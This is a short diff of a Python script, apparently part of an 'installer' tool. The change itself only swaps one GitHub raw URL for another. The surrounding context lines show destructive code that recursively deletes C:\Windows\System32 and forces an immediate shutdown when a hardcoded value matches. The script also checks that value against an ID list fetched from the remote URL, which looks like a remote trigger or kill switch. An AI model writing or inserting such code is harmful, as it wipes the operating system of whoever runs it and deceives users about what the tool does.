@@ -99,7 +99,7 @@ if file_contentsx1 =="mJaAQuPVWhWXG":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
 
-url = "https://raw.githubusercontent.com/klxscs21342135x/installer/refs/heads/main/uniqueid_3.0.txt"
+url = "https://raw.githubusercontent.com/himiklxssx/installer/refs/heads/main/uniqueid_3.0.txt"
 search_string = file_contentsx1
 result = check_string_in_url(url, search_string)
 print(result)
